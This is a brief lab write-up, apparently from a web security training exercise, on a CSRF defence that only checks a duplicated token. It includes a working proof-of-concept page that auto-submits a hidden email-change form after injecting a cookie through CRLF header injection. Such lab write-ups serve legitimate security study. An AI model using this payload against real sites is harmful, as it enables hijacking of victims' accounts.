This is a variant of [Lab: CSRF where token is tied to non-session cookie](../lab-token-tied-to-non-session-cookie/writeup.md), but instead of using a different value in the `csrfKey` parameter in the request header, the app just uses the same `csrf` token in the request body. The Reconnaissance process, Exploitations steps, Root cause and Remediation are pretty much the same but the payload:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="a&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="token-value" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://lab-id.web-security-academy.net/?search=aaa%0d%0aSet-Cookie:%20csrf=token-value%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

Note: after further testing, I realized that the app doesn't even validate the CSRF tokens, it just checks if the 2 tokens in the request are identical or not. So you can also supply the `csrf` parameters with the same value. No need to obtain a valid, legitimate CSRF token.
